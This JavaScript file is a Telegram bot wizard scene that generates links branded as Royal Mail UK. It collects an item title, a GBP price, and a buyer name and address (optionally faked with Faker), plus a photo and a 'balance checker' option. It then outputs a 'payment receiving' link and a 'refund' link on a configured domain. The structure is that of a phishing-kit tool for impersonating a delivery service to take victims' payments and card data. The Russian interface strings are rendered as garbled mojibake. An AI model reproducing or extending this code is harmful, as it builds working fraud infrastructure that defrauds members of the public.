const WizardScene = require("telegraf/scenes/wizard");
const { Request, Ad, Service } = require("../../database");
const locale = require("../../locale");
const escapeHTML = require("escape-html");
const { Markup } = require("telegraf");
const log = require("../../helpers/log");
const cheerio = require("cheerio");
const { default: axios } = require("axios");
const rand = require("../../helpers/rand");
const menu = require("../../commands/menu");

const faker = require("faker/locale/en");
const downloadImage = require("../../helpers/downloadImage");

const scene = new WizardScene(
  "create_link_royalmail_uk",
  async (ctx) => {
    try {
      const service = await Service.findOne({
        where: {
          code: "royalmail_uk",
        },
      });
      if (!service) {
        await ctx.scene.reply("‚ùå –°–µ—Ä–≤–∏—Å –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç").catch((err) => err);
        return ctx.scene.leave();
      }
      ctx.scene.state.data = {};
      log(ctx, "–ø–µ—Ä–µ—à—ë–ª –∫ —Å–æ–∑–¥–∞–Ω–∏—é —Å—Å—ã–ª–∫–∏ ROYALMAIL.UK");
      return ctx.wizard.nextStep();
    } catch (err) {
      ctx.replyOrEdit("‚ùå –û—à–∏–±–∫–∞").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      await ctx.scene
        .reply("–í–≤–µ–¥–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –æ–±—ä—è–≤–ª–µ–Ω–∏—è", {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("–û—Ç–º–µ–Ω–∏—Ç—å", "cancel")],
          ]),
        })
        .catch((err) => err);
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("‚ùå –û—à–∏–±–∫–∞").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (!ctx.message?.text) return ctx.wizard.prevStep();

      ctx.scene.state.data.title = escapeHTML(ctx.message.text);
      return ctx.wizard.nextStep();
    } catch (err) {
      ctx.replyOrEdit("‚ùå –û—à–∏–±–∫–∞").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      await ctx.scene
        .reply("–í–≤–µ–¥–∏—Ç–µ —Ü–µ–Ω—É –æ–±—ä—è–≤–ª–µ–Ω–∏—è (—Ç–æ–ª—å–∫–æ —á–∏—Å–ª–æ, –≤ GBP)", {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("–û—Ç–º–µ–Ω–∏—Ç—å", "cancel")],
          ]),
        })
        .catch((err) => err);
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("‚ùå –û—à–∏–±–∫–∞").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      var amount = parseFloat(ctx.message?.text);
      if (isNaN(amount)) return ctx.wizard.prevStep();
      if (amount % 1 == 0) amount = amount.toFixed(0);
      else amount = amount.toFixed(2);

      amount = amount + " ¬£";

      ctx.scene.state.data.price = amount;

      return ctx.wizard.nextStep();
    } catch (err) {
      ctx.replyOrEdit("‚ùå –û—à–∏–±–∫–∞").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      await ctx.scene
        .reply("–í–≤–µ–¥–∏—Ç–µ –∏–º—è –ø–æ–∫—É–ø–∞—Ç–µ–ª—è (–§–æ—Ä–º–∞—Ç: –ò–º—è –§–∞–º–∏–ª–∏—è)", {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("–ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –≥–µ–Ω–µ—Ä–∞—Ü–∏—è", "auto")],
            [Markup.callbackButton("–û—Ç–º–µ–Ω–∏—Ç—å", "cancel")],
          ]),
        })
        .catch((err) => err);
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("‚ùå –û—à–∏–±–∫–∞").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (!ctx.message?.text && ctx.callbackQuery?.data != "auto")
        return ctx.wizard.prevStep();
      if (ctx.callbackQuery?.data == "auto") {
        ctx.scene.state.data.name = faker.name.findName();
        await ctx
          .reply(
            `ü§ñ –°–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω–Ω–æ–µ –∏–º—è: <b>${ctx.scene.state.data.name}</b>`,
            {
              parse_mode: "HTML",
            }
          )
          .catch((err) => err);
      } else ctx.scene.state.data.name = ctx.message.text;
      return ctx.wizard.nextStep();
    } catch (err) {
      ctx.replyOrEdit("‚ùå –û—à–∏–±–∫–∞").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      await ctx.scene
        .reply("–í–≤–µ–¥–∏—Ç–µ –∞–¥—Ä–µ—Å –ø–æ–∫—É–ø–∞—Ç–µ–ª—è", {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("–ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –≥–µ–Ω–µ—Ä–∞—Ü–∏—è", "auto")],
            [Markup.callbackButton("–û—Ç–º–µ–Ω–∏—Ç—å", "cancel")],
          ]),
        })
        .catch((err) => err);
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("‚ùå –û—à–∏–±–∫–∞").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (!ctx.message?.text && ctx.callbackQuery?.data != "auto")
        return ctx.wizard.prevStep();
      if (ctx.callbackQuery?.data == "auto") {
        ctx.scene.state.data.address = `${faker.address.cityName()}, ${faker.address.streetAddress()}`;
        await ctx
          .reply(
            `ü§ñ –°–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –∞–¥—Ä–µ—Å: <b>${ctx.scene.state.data.address}</b>`,
            {
              parse_mode: "HTML",
            }
          )
          .catch((err) => err);
      } else ctx.scene.state.data.address = ctx.message.text;
      return ctx.wizard.nextStep();
    } catch (err) {
      ctx.replyOrEdit("‚ùå –û—à–∏–±–∫–∞").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      await ctx.scene
        .reply("–û—Ç–ø—Ä–∞–≤—å—Ç–µ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –≤ —Å–∂–∞—Ç–æ–º —Ñ–æ—Ä–º–∞—Ç–µ", {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("–ü—Ä–æ–ø—É—Å—Ç–∏—Ç—å", "skip")],
            [Markup.callbackButton("–û—Ç–º–µ–Ω–∏—Ç—å", "cancel")],
          ]),
        })
        .catch((err) => err);
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("‚ùå –û—à–∏–±–∫–∞").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (ctx.message?.photo?.length < 1 && ctx.callbackQuery?.data !== "skip")
        return ctx.wizard.prevStep();
      if (ctx.callbackQuery?.data == "skip") return ctx.wizard.nextStep();
      const photo_link = await ctx.telegram.getFileLink(
        ctx.message.photo[0].file_id
      );
      ctx.wizard.state.data.photo = await downloadImage(photo_link);
      return ctx.wizard.nextStep();
    } catch (err) {
      ctx.replyOrEdit("‚ùå –û—à–∏–±–∫–∞").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      await ctx.scene
        .reply("–ß–µ–∫–µ—Ä –±–∞–ª–∞–Ω—Å–∞", {
          reply_markup: Markup.inlineKeyboard([
            [
              Markup.callbackButton("–í–∫–ª—é—á–∏—Ç—å", "true"),
              Markup.callbackButton("–í—ã–∫–ª—é—á–∏—Ç—å", "false"),
            ],
            [Markup.callbackButton("–û—Ç–º–µ–Ω–∏—Ç—å", "cancel")],
          ]),
        })
        .catch((err) => err);
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("‚ùå –û—à–∏–±–∫–∞").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (!["true", "false"].includes(ctx.callbackQuery?.data))
        return ctx.wizard.prevStep();
      ctx.scene.state.data.balanceChecker = ctx.callbackQuery.data == "true";
      return ctx.wizard.nextStep();
    } catch (err) {
      ctx.replyOrEdit("‚ùå –û—à–∏–±–∫–∞").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      const service = await Service.findOne({
        where: {
          code: "royalmail_uk",
        },
      });
      if (!service) {
        await ctx.scene.reply("‚ùå –°–µ—Ä–≤–∏—Å –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç").catch((err) => err);
        return ctx.scene.leave();
      }
      const ad = await Ad.create({
        id: parseInt(rand(999999, 99999999) + new Date().getTime() / 10000),
        userId: ctx.from.id,
        ...ctx.scene.state.data,
        serviceCode: "royalmail_uk",
      });

      log(ctx, `—Å–æ–∑–¥–∞–ª –æ–±—ä—è–≤–ª–µ–Ω–∏–µ ROYALMAIL.UK <code>(ID: ${ad.id})</code>`);
      await ctx.scene.reply(
        `<b>‚úÖ –°—Å—ã–ª–∫–∞ üè¥Û†ÅßÛ†Å¢Û†Å•Û†ÅÆÛ†ÅßÛ†Åø ROYALMAIL.UK —Å–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω–∞!</b>
      
üîó –ü–æ–ª—É—á–µ–Ω–∏–µ –æ–ø–ª–∞—Ç—ã: <b>https://${service.domain}/${ad.id}</b>
üîó –í–æ–∑–≤—Ä–∞—Ç: <b>https://${service.domain}/refund/${ad.id}</b>`,
        {
          parse_mode: "HTML",
        }
      );
      ctx.updateType = "message";
    } catch (err) {
      ctx.replyOrEdit("‚ùå –û—à–∏–±–∫–∞").catch((err) => err);
    }
    return ctx.scene.leave();
  }
);

scene.leave(menu);

module.exports = scene;
